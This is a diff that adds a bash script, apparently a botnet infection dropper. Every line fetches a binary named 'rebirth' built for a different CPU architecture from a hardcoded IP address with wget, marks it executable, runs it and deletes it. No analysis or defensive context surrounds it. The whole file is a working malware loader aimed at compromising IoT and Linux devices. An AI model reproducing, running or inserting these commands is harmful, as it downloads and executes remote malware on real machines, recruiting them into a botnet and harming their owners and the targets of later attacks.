@@ -1,0 +1,15 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.98.52.167/rebirth.mips; chmod +x rebirth.mips; ./rebirth.mips; rm -rf rebirth.mips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.98.52.167/rebirth.mpsl; chmod +x rebirth.mpsl; ./rebirth.mpsl; rm -rf rebirth.mpsl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.98.52.167/rebirth.sh4; chmod +x rebirth.sh4; ./rebirth.sh4; rm -rf rebirth.sh4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.98.52.167/rebirth.x86; chmod +x rebirth.x86; ./rebirth.x86; rm -rf rebirth.x86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.98.52.167/rebirth.arm6; chmod +x rebirth.arm6; ./rebirth.arm6; rm -rf rebirth.arm6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.98.52.167/rebirth.i686; chmod +x rebirth.i686; ./rebirth.i686; rm -rf rebirth.i686
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.98.52.167/rebirth.ppc; chmod +x rebirth.ppc; ./rebirth.ppc; rm -rf rebirth.ppc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.98.52.167/rebirth.i586; chmod +x rebirth.i586; ./rebirth.i586; rm -rf rebirth.i586
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.98.52.167/rebirth.m68k; chmod +x rebirth.m68k; ./rebirth.m68k; rm -rf rebirth.m68k
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.98.52.167/rebirth.sparc; chmod +x rebirth.sparc; ./rebirth.sparc; rm -rf rebirth.sparc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.98.52.167/rebirth.arm4; chmod +x rebirth.arm4; ./rebirth.arm4; rm -rf rebirth.arm4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.98.52.167/rebirth.arm5; chmod +x rebirth.arm5; ./rebirth.arm5; rm -rf rebirth.arm5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.98.52.167/rebirth.arm7; chmod +x rebirth.arm7; ./rebirth.arm7; rm -rf rebirth.arm7
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.98.52.167/rebirth.ppc440fp; chmod +x rebirth.ppc440fp; ./rebirth.ppc440fp; rm -rf rebirth.ppc440fp
